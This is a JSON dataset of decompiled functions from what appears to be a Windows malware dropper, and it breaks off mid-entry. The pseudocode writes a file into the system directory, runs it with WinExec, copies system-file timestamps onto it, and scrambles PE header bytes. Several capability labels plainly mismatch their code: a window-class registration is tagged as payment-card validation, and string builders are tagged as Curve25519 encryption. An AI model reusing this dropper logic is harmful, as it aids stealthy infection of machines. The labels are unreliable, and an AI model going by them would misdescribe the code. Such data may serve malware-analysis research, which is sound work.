{
    "00401000": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20fh\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00401000(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t extraout_ECX;\n    uint *puVar3;\n    ushort in_SS;\n    bool bVar4;\n    bool bVar5;\n    ushort uVar6;\n    ushort uVar7;\n    uchar lpBuffer;\n    uint var_20fh;\n    uint s;\n    uint var_8h;\n    uint var_4h;\n    \n    _lpBuffer = _lpBuffer & 0xffffff00;\n    s._0_1_ = 0;\n    puVar3 = &var_20fh;\n    // [00] -r-x section size 20480 named .text\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    puVar3 = &s + 1;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    do {\n        (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n        (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x423148, &lpBuffer, arg_8h);\n        bVar4 = extraout_ECX < 0x5354;\n        bVar5 = (POPCOUNT(extraout_ECX - 0x5354 & 0xff) & 1U) == 0;\n        uVar1 = fcn.00401b70(&var_4h, &var_8h);\n        if (bVar5) break;\n        uVar6 = uVar1;\n        uVar7 = uVar1 >> 0x10;\n        if (!bVar5) break;\n        segment(in_SS, *0x10 + -0x21c);\n        uVar1 = 0xb7bc9ea5;\n        if (bVar4) goto code_r0x004010dd;\n    } while (bVar5);\n    fcn.00401130(var_4h);\n    uVar6 = var_8h;\n    uVar7 = var_8h >> 0x10;\n    uVar1 = var_4h;\ncode_r0x004010dd:\n    iVar2 = fcn.00402ed0(&s, uVar1, CONCAT22(uVar7, uVar6));\n    if (iVar2 == 0) {\n        return 0;\n    }\n    _lpBuffer = 0xffffffff;\n    fcn.00404ec0(&s, 0xffffffff);\n    return 1;\n}\n",
        "token_count": 695
    },
    "00403f80": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404219) overlaps instruction at (ram,0x00404215)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00403f80(uint32_t param_1, int32_t param_2)\n\n{\n    uchar uVar1;\n    uint32_t uVar2;\n    ushort uVar3;\n    uint *in_EAX;\n    uint8_t extraout_AH;\n    uint uVar4;\n    int32_t iVar5;\n    uint8_t extraout_CH;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint8_t uVar6;\n    ushort extraout_DX;\n    ushort extraout_DX_00;\n    ushort extraout_DX_01;\n    uint extraout_EDX;\n    uint extraout_EDX_00;\n    uint extraout_EDX_01;\n    int32_t unaff_EBX;\n    uint *puVar7;\n    uint *puVar8;\n    uint *puVar9;\n    uchar *puVar10;\n    uint *puVar11;\n    uchar *puVar12;\n    uchar *puVar13;\n    int32_t unaff_EBP;\n    int32_t unaff_ESI;\n    uchar *unaff_EDI;\n    uchar *puVar14;\n    bool bVar15;\n    bool bVar16;\n    char in_SF;\n    char in_OF;\n    bool bVar17;\n    ulong uVar18;\n    unkbyte6 Var19;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    \n    if (in_OF == in_SF) {\n        uStack16 = CONCAT22(param_1, uStack16);\n        param_1 = param_1 & 0xffff;\n        uVar6 = param_1 >> 8;\n        if (in_OF == in_SF) goto code_r0x00403f98;\n    }\n    else {\ncode_r0x00403f98:\n        uVar6 = param_1 >> 8;\n        uStack16 = 0x20;\n        uStack20 = 0x4234b0;\n        uStack24 = 0xe;\n    }\n    puVar7 = &stack0xffffffe8 ^ *(unaff_EBX + 0x6a);\n    *(unaff_ESI + -0x50) = *(unaff_ESI + -0x50) & uVar6;\n    *(param_2 + 0xe) = *(param_2 + 0xe) + uVar6;\n    puVar7[-1] = 0x4235b4;\n    puVar7[-2] = 0x403fab;\n    fcn.004051d0();\n    puVar7[2] = extraout_ECX;\n    *(puVar7 + 6) = extraout_DX;\n    puVar7[2] = 0x26;\n    puVar7[1] = 0x4234d0;\n    *puVar7 = 0xe;\n    puVar7[-1] = 0x4235b4;\n    puVar7[-2] = 0x403fd5;\n    uVar3 = fcn.004051d0();\n    puVar7[2] = extraout_EDX;\n    *(puVar7 + 6) = uVar3;\n    puVar7[2] = 8;\n    puVar7[1] = 0x4234f8;\n    *puVar7 = 0xe;\n    puVar7[-1] = 0x4235b4;\n    puVar7[-2] = 0x404005;\n    fcn.004051d0();\n    puVar7[2] = extraout_EDX_00;\n    *(puVar7 + 6) = unaff_EBX;\n    puVar7[2] = 0x19;\n    puVar7[1] = 0x423500;\n    *puVar7 = 0xe;\n    puVar7[-1] = 0x4235b4;\n    puVar7[-2] = 0x40403c;\n    fcn.004051d0();\n    puVar7[2] = extraout_EDX_01;\n    uVar6 = extraout_EDX_01 + 0x15;\n    bVar15 = uVar6 < extraout_AH;\n    bVar17 = SBORROW1(uVar6, extraout_AH);\n    bVar16 = uVar6 == extraout_AH;\n    puVar7[2] = 0xb;\n    puVar7[1] = 0x42351c;\n    *puVar7 = 0xe;\n    puVar8 = puVar7 + -1;\n    puVar9 = puVar7 + -1;\n    puVar7[-1] = 0x4235b4;\n    puVar7[-2] = 0x40405c;\n    fcn.004051d0();\n    if (bVar17) {\ncode_r0x00404080:\n        puVar7[-2] = 0x12;\n        puVar7[-3] = 0x423528;\n        puVar8 = puVar7 + -4;\n        puVar7[-4] = 0xe;\ncode_r0x00404075:\n        *(puVar8 + -4) = 0x56;\n        *(puVar8 + -8) = 0x4235b4;\n        *(puVar8 + -0xc) = 0x404093;\n        uVar4 = fcn.004051d0();\n        *(puVar8 + 0x16) = unaff_EDI;\n        *(puVar8 + 0x12) = uVar4;\n        *(puVar8 + 0xe) = extraout_ECX_00;\n        puVar14 = unaff_EDI & 0xffff0000 | *(puVar8 + 0x16);\n        *(puVar8 + 0x14) = 0x12;\n        *(puVar8 + 0x10) = 0x42353c;\n        *(puVar8 + 0xc) = 0xe;\n        *(puVar8 + 8) = 0x4235b4;\n        *(puVar8 + 4) = 0x4040be;\n        uVar18 = fcn.004051d0();\n        *(puVar8 + 0x14) = uVar18;\n        *(puVar8 + 0x10) = uVar18 >> 0x20;\n        *(puVar8 + 0xc) = in_EAX;\n        bVar15 = false;\n        in_EAX = *(puVar8 + 0xc);\n        *(puVar8 + 0x14) = 2;\n        *(puVar8 + 0x10) = 0x423550;\n        *(puVar8 + 0xc) = 0xe;\n        puVar9 = puVar8 + 8;\n        *(puVar8 + 8) = 0x4235b4;\n        *(puVar8 + 4) = 0x4040e8;\n        fcn.004051d0();\n        puVar10 = puVar8 + 8;\n        if (!bVar15) goto code_r0x004040ee;\n    }\n    else {\n        *(puVar7 + -6) = extraout_DX_00;\n        if (!bVar17) goto code_r0x00404080;\n        puVar14 = unaff_EDI + 1;\n        uVar1 = in(*(puVar7 + -6));\n        *unaff_EDI = uVar1;\n        unaff_EDI = puVar14;\n        if (bVar15 || bVar16) goto code_r0x00404075;\ncode_r0x004040ee:\n        puVar10 = puVar9;\n        if (bVar15) goto code_r0x004040f0;\n    }\n    *(puVar10 + -4) = 8;\n    *(puVar10 + -8) = 0x423554;\n    puVar9 = puVar10 + -0xc;\n    *(puVar10 + -0xc) = 0xe;\ncode_r0x004040f0:\n    uVar2 = *(puVar14 + 0xe58be73);\n    puVar9[-1] = puVar9;\n    puVar9[-2] = 0x4235b4;\n    puVar9[-3] = 0x40410c;\n    uVar18 = fcn.004051d0();\n    puVar9[5] = uVar18;\n    puVar9[4] = uVar18 >> 0x20;\n    uVar6 = uVar18 >> 0x20;\n    bVar15 = ((CONCAT11((uVar18 >> 8) + -0x2b, uVar18) ^ 0x3d) + 0x7c28 ^ CONCAT11(uVar18 >> 0x28 | uVar6, uVar6)) +\n             0xbfff < 0;\n    puVar9[5] = 8;\n    puVar9[4] = 0x42355c;\n    puVar9[3] = 0xe;\n    puVar11 = puVar9 + 2;\n    puVar9[2] = 0x4235b4;\n    puVar9[1] = 0x404139;\n    iVar5 = fcn.004051d0();\n    if ((bVar15) || (!bVar15)) {\n        puVar9[1] = 6;\n        *puVar9 = 0x423564;\n        puVar11 = puVar9 + -1;\n        puVar9[-1] = 0xe;\n    }\n    bVar15 = (iVar5 + 0x6468066aU ^ 0xe6a0042) < 0;\n    puVar12 = puVar11 + -4;\n    *(puVar11 + -4) = 0x4235b4;\n    *(puVar11 + -8) = 0x40415a;\n    fcn.004051d0();\n    if ((bVar15) || (!bVar15)) {\n        *(puVar11 + -8) = 7;\n        *(puVar11 + -0xc) = 0x42356c;\n        puVar12 = puVar11 + -0x10;\n        *(puVar11 + -0x10) = 0xe;\n    }\n    uVar1 = in(extraout_DX_01);\n    *(puVar14 ^ uVar2) = uVar1;\n    *(puVar12 + -4) = 0x4235b4;\n    *(puVar12 + -8) = 0x404182;\n    Var19 = fcn.004051d0();\n    *(puVar12 + 0x2a) = Var19 >> 0x20;\n    *(puVar12 + 0x26) = Var19;\n    *(puVar12 + 0x28) = 7;\n    *(puVar12 + 0x24) = 0x423574;\n    *(puVar12 + 0x20) = 0xe;\n    *(puVar12 + 0x1c) = 0x4235b4;\n    *(puVar12 + 0x18) = 0x4041ad;\n    uVar18 = fcn.004051d0();\n    *(puVar12 + 0x28) = uVar18;\n    *(puVar12 + 0x24) = unaff_EBP + 0x68086a76;\n    *(puVar12 + 0x20) = uVar18 >> 0x20;\n    uVar4 = *(puVar12 + 0x24);\n    *(puVar12 + 0x28) = 6;\n    *(puVar12 + 0x24) = 0x42357c;\n    *(puVar12 + 0x20) = 0xe;\n    *(puVar12 + 0x1c) = 0x4235b4;\n    *(puVar12 + 0x18) = 0x4041d4;\n    Var19 = fcn.004051d0();\n    *(puVar12 + 0x28) = Var19;\n    bVar15 = false;\n    bVar16 = ((CONCAT11(Var19 >> 8 & Var19 >> 0x28, Var19) * 2 | Var19 >> 0x20) ^ 0x6c00) == uVar4;\n    *(puVar12 + 0x28) = 0x25;\n    *(puVar12 + 0x24) = 0x423584;\n    *(puVar12 + 0x20) = 0xe;\n    puVar13 = puVar12 + 0x1c;\n    *(puVar12 + 0x1c) = 0x4235b4;\n    *(puVar12 + 0x18) = 0x4041ff;\n    iVar5 = fcn.004051d0();\n    if ((bVar15 || bVar16) || (!bVar15 && !bVar16)) {\n        *(puVar12 + 0x18) = 8;\n        *(puVar12 + 0x14) = 0x4235ac;\n        puVar13 = puVar12 + 0x10;\n        *(puVar12 + 0x10) = 0xe;\n    }\n    *((puVar14 ^ uVar2) + 1) = *in_EAX;\n    puVar13[-0x54] = puVar13[-0x54] | extraout_CH;\n    *(iVar5 + -4) = 0x4235b4;\n    *(iVar5 + -8) = 0x40422c;\n    fcn.004051d0();\n    return;\n}\n",
        "token_count": 3094
    },
    "00404b20": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404bec) overlaps instruction at (ram,0x00404be9)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00404b20(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    iVar1 = fcn.00401bf0();\n    if (iVar1 == 0) {\n        return false;\n    }\n    fcn.00402900();\n    iVar1 = fcn.00402810(0x423198);\n    if (iVar1 != -1) {\n        return false;\n    }\n    fcn.00403ba0();\n    *0x4235dc = 1;\n    iVar1 = fcn.00404320();\n    if (iVar1 != 0) {\n        return false;\n    }\n    var_20h = 0;\n    var_80h._0_1_ = 0;\n    puVar2 = &var_1fh;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    var_60h._0_1_ = 0;\n    puVar2 = &var_80h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    var_40h._0_1_ = 0;\n    puVar2 = &var_60h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar2 = &var_40h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    iVar1 = fcn.00404360(&var_80h, &var_60h, &var_20h, &var_40h);\n    if (iVar1 != 0) {\n        iVar1 = fcn.00401000(&var_20h);\n        if (iVar1 != 0) {\n            iVar1 = fcn.00404830(&var_80h, &var_60h, &var_20h, &var_40h);\n            return iVar1 != 0;\n        }\n        return false;\n    }\n    return false;\n}\n",
        "token_count": 725
    },
    "00401130": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040128f) overlaps instruction at (ram,0x0040128b)\n// \n\nint64_t __cdecl fcn.00401130(int16_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint8_t uVar3;\n    char cVar6;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint32_t uVar7;\n    char *in_EDX;\n    uint extraout_EDX;\n    uchar *puVar8;\n    uint *unaff_ESI;\n    uint *puVar9;\n    uint *puVar10;\n    int32_t unaff_EDI;\n    bool bVar11;\n    bool bVar12;\n    uint8_t in_AF;\n    unkbyte10 extraout_ST0;\n    ulong uVar13;\n    ushort uVar14;\n    uint var_4h;\n    \n    puVar8 = &stack0xfffffffc;\n    if (*arg_8h != 0x5a4d) {\n        return ZEXT48(in_EDX) << 0x20;\n    }\n    piVar4 = *(arg_8h + 0x1e) + arg_8h;\n    bVar11 = (POPCOUNT(piVar4 & 0xff) & 1U) == 0;\n    if ((bVar11) || (!bVar11)) {\n        bVar11 = *piVar4 - 0x4550U == 0;\n        uVar3 = POPCOUNT(*piVar4 - 0x4550U & 0xff);\n    }\n    else {\n        out(*unaff_ESI, in_EDX);\n        do {\n            cVar6 = piVar4 >> 8;\n            in_AF = 9 < (piVar4 & 0xf) | in_AF;\n            piVar4 = CONCAT31(CONCAT21(piVar4 >> 0x10, cVar6 - in_AF), -in_AF);\n        } while (in_AF || cVar6 == *in_EDX);\n        piVar1 = unaff_EDI + in_EDX * 2;\n        *piVar1 = (*piVar1 + 0x7b) - in_AF;\n        *(arg_8h + -0x7f) = piVar4;\n        *piVar4 = *piVar4 + -in_AF;\n        bVar11 = *piVar4 == '\\0';\n        uVar3 = POPCOUNT(*piVar4);\n        unaff_ESI = unaff_ESI + 1;\n    }\n    bVar12 = (uVar3 & 1) == 0;\n    if (!bVar11) {\n        return ZEXT48(in_EDX) << 0x20;\n    }\n    if ((bVar12) || (!bVar12)) {\n        piVar4 = piVar4[0x16];\n    }\n    else {\n        unaff_ESI = 0x34a96cf4;\n        puVar8 = *0x8b17b43a;\n    }\n    if (piVar4 != NULL) {\n        return ZEXT48(piVar4) << 0x20;\n    }\n    *(puVar8 + -4) = 0x40;\n    if (*(arg_8h + 0x1e) < 0x81) {\n        return 0;\n    }\n    if (*(*(puVar8 + 8) + 0x3c) < 0xc0) {\n        *(puVar8 + -4) = *(*(puVar8 + 8) + 0x3c) - 0x80;\n    }\n    puVar2 = *(puVar8 + -4);\n    uVar13 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_(puVar2);\n    piVar4 = uVar13 >> 0x20;\n    puVar10 = uVar13;\n    if (puVar10 == NULL) {\n        return ZEXT48(piVar4) << 0x20;\n    }\n    if ((puVar10 < 0) || (puVar10 >= 0)) {\n        unaff_ESI = NULL;\n    }\n    *(puVar10 + -0x1f3a4905) = extraout_ST0;\n    uVar14 = uVar13;\n    *piVar4 = *piVar4 + -0x9cc207c;\n    if (puVar2 != NULL) {\n        do {\n            iVar5 = (*_sym.imp.MSVCRT.dll_rand)(uVar14);\n            puVar9 = unaff_ESI + 1;\n            *(unaff_ESI + puVar10) = iVar5 % 0xff;\n            unaff_ESI = puVar9;\n        } while (puVar9 < puVar2);\n    }\n    puVar9 = *(puVar8 + 8) + 0x80;\n    for (uVar7 = puVar2 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n        *puVar9 = *puVar10;\n        puVar10 = puVar10 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar7 = puVar2 & 3; uVar7 != 0; uVar7 = uVar7 - 1) {\n        *puVar9 = *puVar10;\n        puVar10 = puVar10 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    sub.MSVCRT.dll_void___cdecl_operator_delete_void__(uVar13);\n    return CONCAT44(extraout_EDX, 1);\n}\n",
        "token_count": 1246
    },
    "00403220": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00403220(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x4235dc == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00402af0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x423408, acStack1304, &uStack2112);\n    uStack2088 = 0x423490;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x4234a8;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.004030b0(auStack1564, 0x423404, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1866
    },
    "00404ec0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404f5f) overlaps instruction at (ram,0x00404f5e)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404ec0(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint8_t *unaff_EBX;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint *puVar9;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint var_1ch;\n    uint var_14h;\n    int32_t var_4h;\n    \n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar5 = &var_22fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_12ch = '\\0';\n    puVar5 = &var_12bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    uVar3 = 0xffffffff;\n    pcVar7 = &lpBuffer;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = &var_12ch;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    uVar3 = 0xffffffff;\n    pcVar7 = 0x42316c;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar7 = &var_12ch;\n    do {\n        pcVar8 = pcVar7;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar8 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = pcVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_12ch, 0, &var_28h);\n    iVar2 = var_4h;\n    if ((arg_ch == -1) && (iVar2 = fcn.00404760(arg_8h),  iVar2 == -1)) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &var_1ch, &var_14h);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1215
    },
    "00401320": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00401320(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.004018a0;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x407010;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 217
    },
    "00401380": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
